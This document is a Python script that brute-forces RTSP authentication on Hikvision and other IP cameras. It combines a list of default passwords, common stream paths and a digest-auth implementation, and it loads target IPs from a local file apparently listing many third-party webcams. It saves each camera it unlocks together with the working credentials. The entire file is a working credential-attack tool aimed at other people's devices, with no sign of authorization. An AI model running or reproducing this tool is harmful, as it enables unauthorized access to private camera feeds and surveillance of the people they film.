"""Hikvision RTSP brute forcer with longer credential list.

Tests RTSP auth on Hikvision cams. Tries default credentials and
common Hikvision passwords. Saves results to JSON.
"""
import socket
import time
import json
import re
import base64
import hashlib
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import csv
import sys

# Force unbuffered
sys.stdout.reconfigure(line_buffering=True)

# Credentials to test
CREDS = [
    '',  # No auth
    'admin:admin',
    'admin:12345',
    'admin:password',
    'admin:Admin12345',
    'admin:1234',
    'admin:1111111',
    'admin:abcd1234',
    'admin:system',
    'admin:user',
    'admin:4321',
    'admin:7ujMko0admin',
    'admin:pass',
    'admin:123456',
    'admin:default',
    'admin:hik12345',
    'admin:Hik12345',
    'admin:12345abc',
    'admin:abcd1234',
    'admin:9999',
    'admin:0000',
    'admin:99999999',
    'admin:0',
    'admin:1',
    'admin:@ABC123',
    'admin:abc12345',
    'root:root',
    'root:12345',
    'user:user',
    'user:12345',
    'guest:guest',
    'operator:operator',
]

# Common paths to test
PATHS = [
    '/Streaming/tracks/101',  # Hikvision main stream
    '/Streaming/tracks/102',  # Hikvision sub stream
    '/Streaming/tracks/103',  # Hikvision third stream
    '/Streaming/Channels/101',  # Dahua
    '/cam/realmonitor',  # Dahua MJPEG
    '/onvif/streaming/channels/101',  # ONVIF
    '/live',  # Generic
    '/live.sdp',  # HiSilicon
    '/11',  # Hipcam main
    '/12',  # Hipcam sub
    '/trackID=1',  # GeoVision
    '/h264/ch1/main/av_stream',  # HiSilicon
    '/h264/ch1/sub/av_stream',  # HiSilicon
    '/0/usrnm:pwd/0',  # AirLive
    '/live/0/main',  # Uniview
    '/live/0/sub',  # Uniview
    '/av0_0',  # Uniview
    '/',  # Generic
    '/PSIA/Streaming/channels/101',  # PSIA
]

PROGRESS_FILE = 'hikvision_rtsp_bf_progress.json'


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def hikvision_digest(user, pwd, realm, nonce, method, uri):
    """Compute Hikvision Digest auth response."""
    ha1 = md5(f'{user}:{realm}:{pwd}')
    ha2 = md5(f'{method}:{uri}')
    response = md5(f'{ha1}:{nonce}:{ha2}')
    return response


def try_rtsp(host, port, path, creds, timeout=4):
    """Try RTSP DESCRIBE. Returns (status, body)."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        if creds:
            user, pwd = creds.split(':') if ':' in creds else (creds, '')
            url = f'rtsp://{user}:{pwd}@{host}:{port}{path}'
        else:
            url = f'rtsp://{host}:{port}{path}'
            user = pwd = ''
        req = f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Hikvision\r\n\r\n'
        s.send(req.encode())
        data = s.recv(4096)
        s.close()
        if b'200' in data:
            return ('200', data.decode('utf-8', errors='replace')[:500])
        if b'401' in data:
            # Need to try with digest
            www_auth = b''
            for line in data.split(b'\r\n'):
                if b'WWW-Authenticate:' in line:
                    www_auth = line
                    break
            realm_m = re.search(rb'realm="([^"]+)"', www_auth)
            nonce_m = re.search(rb'nonce="([^"]+)"', www_auth)
            if realm_m and nonce_m and user:
                realm = realm_m.group(1).decode()
                nonce = nonce_m.group(1).decode()
                response = hikvision_digest(user, pwd, realm, nonce, 'DESCRIBE', path)
                s2 = socket.create_connection((host, port), timeout=timeout)
                s2.settimeout(timeout)
                auth_header = f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{path}", response="{response}"'
                req2 = f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth_header}\r\nUser-Agent: Hikvision\r\n\r\n'
                s2.send(req2.encode())
                data2 = s2.recv(4096)
                s2.close()
                if b'200' in data2:
                    return ('200', data2.decode('utf-8', errors='replace')[:500])
            return ('401', data.decode('utf-8', errors='replace')[:200])
        if b'404' in data:
            return ('404', '')
        if b'503' in data:
            return ('503', '')
        if b'500' in data:
            return ('500', '')
        return ('other', data.decode('utf-8', errors='replace')[:200])
    except socket.timeout:
        return ('timeout', '')
    except Exception as e:
        return ('err', str(e)[:50])


def main():
    # Get target IPs from CSV
    import glob
    CSV_PATH = None
    for f in glob.glob(r'C:\Users\eli6-admin\Documents\**/controllable_Webcams.csv', recursive=True):
        CSV_PATH = f
        break
    csv.field_size_limit(2**31 - 1)
    targets = set()
    with open(CSV_PATH, 'r', encoding='utf-8', errors='replace') as f:
        for row in csv.DictReader(f):
            url = row.get('url', '') or ''
            brand = (row.get('brand') or '').lower()
            m = re.match(r'(?:rtsp|http)s?://(?:[^@]+@)?(\d+\.\d+\.\d+\.\d+)', url)
            if m:
                ip = m.group(1)
                # Filter to likely Hikvision cams (any IP cam)
                if any(s in url for s in ['axis', 'mjpg', 'cam_1', 'Streaming', 'onvif']) or 'hikvision' in brand:
                    targets.add(ip)
    print(f'[Hik RTSP BF] {len(targets)} target IPs')

    # Load progress
    progress = {'tested': set(), 'unlocked': []}
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE) as f:
            p = json.load(f)
        progress['tested'] = set(p.get('tested', []))
        progress['unlocked'] = p.get('unlocked', [])
        print(f'  Loaded {len(progress["tested"])} tested, {len(progress["unlocked"])} unlocked')

    # Process
    for i, ip in enumerate(sorted(targets)):
        if ip in progress['tested']:
            continue
        # Try paths × creds
        for path in PATHS[:5]:  # Top 5 paths
            for creds in CREDS[:5]:  # Top 5 creds
                status, body = try_rtsp(ip, 554, path, creds, timeout=3)
                if status == '200':
                    print(f'  [{ip}] {path} {creds} -> 200!', flush=True)
                    progress['unlocked'].append({
                        'ip': ip,
                        'path': path,
                        'creds': creds,
                        'body': body[:200],
                    })
                    break
                time.sleep(0.3)  # Rate limit
            if progress['unlocked'] and progress['unlocked'][-1]['ip'] == ip:
                break
        progress['tested'].add(ip)

        if (i + 1) % 20 == 0:
            print(f'  [{i+1}/{len(targets)}] tested={len(progress["tested"])} unlocked={len(progress["unlocked"])}', flush=True)
            with open(PROGRESS_FILE, 'w') as f:
                json.dump({
                    'tested': list(progress['tested']),
                    'unlocked': progress['unlocked'],
                }, f, indent=2)

    # Final save
    with open(PROGRESS_FILE, 'w') as f:
        json.dump({
            'tested': list(progress['tested']),
            'unlocked': progress['unlocked'],
        }, f, indent=2)
    print(f'\n[Hik RTSP BF] Final: tested={len(progress["tested"])} unlocked={len(progress["unlocked"])}')


if __name__ == '__main__':
    main()
